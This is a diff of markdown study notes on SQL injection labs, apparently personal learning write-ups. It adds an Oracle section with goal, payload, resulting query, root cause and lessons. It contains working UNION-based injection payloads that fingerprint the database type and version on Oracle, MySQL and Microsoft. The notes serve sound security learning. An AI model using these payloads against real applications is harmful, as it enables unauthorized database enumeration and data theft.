@@ -31,14 +31,14 @@ AND released = 1
 
 ### Root Cause
 
-User-controlled input was concatenated directly into the SQL query.
+The application concatenated user-controlled input directly into the SQL query.
 
 The application did not distinguish between:
 
 - SQL code
 - User data
 
-As a result, user input was interpreted as part of the SQL statement.
+As a result, the system interpreted user input as part of the SQL statement.
 
 ### What I Learned
 
@@ -78,9 +78,42 @@ AND password =  '123'
 - Password hashing protects stored passwords but does not prevent SQL Injection.
 - Secure authentication depends on both password security and query integrity.
 
-#### SQL injection attack, querying the database type and version on Oracle
-- '+UNION+SELECT+'abc','def'+FROM+dual--
-- '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+## SQL injection attack, querying the database type and version on Oracle
+
+### Goal
+Identify the database type and version.
+### Payload
+
+Determine column count:
+
+```sql
+' UNION SELECT 'abc', 'def' FROM dual--
+```
+Retrieve version information:
+
+```sql
+' UNION SELECT BANNER, NULL FROM v$version--
+```
+
+### Result
+
+```sql
+SELECT * FROM products
+WHERE category = '' UNION SELECT BANNER, NULL FROM v$version--'
+AND released = 1
+```
+
+### Root Cause
+- User-controlled input was concatenated directly into the query,
+  therefore it was misinterpreted as an SQL statement rather than pure user data
+
+### What I Learned
+
+- Oracle requires selecting from a valid table. The built-in `dual` table is commonly used.
+- Different database systems expose metadata through different system tables and functions.
+- Database fingerprinting is an important step after gaining SQL injection.
+- Once the database type is identified, publicly available documentation can be used to discover useful system tables and metadata sources. Attackers can use database-specific metadata tables to enumerate schemas, tables, columns, and other sensitive information.
+
 #### SQL injection attack, querying the database type and version on MySQL and Microsoft
 - '+UNION+SELECT+'abc','def'--
 - '+UNION+SELECT+@@version,+NULL#
